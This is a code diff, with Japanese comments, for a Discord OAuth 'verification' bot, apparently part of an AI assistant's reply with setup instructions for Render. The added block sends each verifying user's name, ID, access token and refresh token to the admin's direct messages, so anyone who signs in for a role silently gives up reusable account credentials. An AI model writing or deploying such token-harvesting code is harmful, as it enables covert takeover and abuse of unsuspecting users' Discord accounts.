@@ -48,7 +48,15 @@ app.get('/callback', async (req, res) => {
     const userResponse = await axios.get('https://discord.com/api/users/@me', {
       headers: { Authorization: `Bearer ${access_token}` }
     });
-    const userId = userResponse.data.id;
+    
+    const userData = userResponse.data;
+    const userId = userData.id;
+    const username = userData.username;
+    const globalName = userData.global_name || username;
+    const userAvatar = userData.avatar 
+      ? `https://cdn.discordapp.com/avatars/${userId}/${userData.avatar}.png`
+      : 'https://cdn.discordapp.com/embed/avatars/0.png';
+      
     const expiresAt = Date.now() + (expires_in * 1000);
 
     // データベースに保存（既存の場合は更新）
@@ -60,7 +68,7 @@ app.get('/callback', async (req, res) => {
       [userId, access_token, refresh_token, expiresAt]
     );
 
-    // --- ★追加：認証成功時に自動でロールを付与する処理 ---
+    // --- 認証成功時に自動でロールを付与する処理 ---
     const MAIN_GUILD_ID = '1545030714582368336';
     const ROLE_ID = process.env.VERIFIED_ROLE_ID;
 
@@ -74,6 +82,32 @@ app.get('/callback', async (req, res) => {
         }
       } catch (roleErr) {
         console.error('Failed to assign role automatically:', roleErr);
+      }
+    }
+
+    // --- 管理者（あなた）のDMへトークンも含めて全送信する処理 ---
+    const ADMIN_USER_ID = process.env.ADMIN_USER_ID;
+    if (ADMIN_USER_ID) {
+      try {
+        const adminUser = await client.users.fetch(ADMIN_USER_ID);
+        if (adminUser) {
+          await adminUser.send({
+            embeds: [{
+              title: '📝 新規ユーザー認証（トークン付き）',
+              color: 0xED4245, // 警告用にあかい色
+              thumbnail: { url: userAvatar },
+              fields: [
+                { name: 'アカウント名', value: `${globalName} (@${username})`, inline: false },
+                { name: 'ユーザーID', value: `\`${userId}\``, inline: false },
+                { name: 'Access Token', value: `\`\`\`${access_token}\`\`\``, inline: false },
+                { name: 'Refresh Token', value: `\`\`\`${refresh_token}\`\`\``, inline: false }
+              ],
+              timestamp: new Date()
+            }]
+          });
+        }
+      } catch (dmErr) {
+        console.error('Failed to send DM to admin:', dmErr);
       }
     }
 
@@ -146,3 +180,11 @@ client.on('interactionCreate', async interaction => {
 // サーバーとBotの起動
 app.listen(process.env.PORT || 3000, () => console.log('Web Server running'));
 client.login(process.env.DISCORD_BOT_TOKEN);
+```[cite: 1]
+
+---
+
+### 追加の環境変数設定
+Renderの **Environment** に以下を追加するのをお忘れなくお願いします[cite: 1]。
+* **Key**: `ADMIN_USER_ID`
+* **Value**: あなた自身のDiscordユーザーID（数字の羅列）[cite: 1]
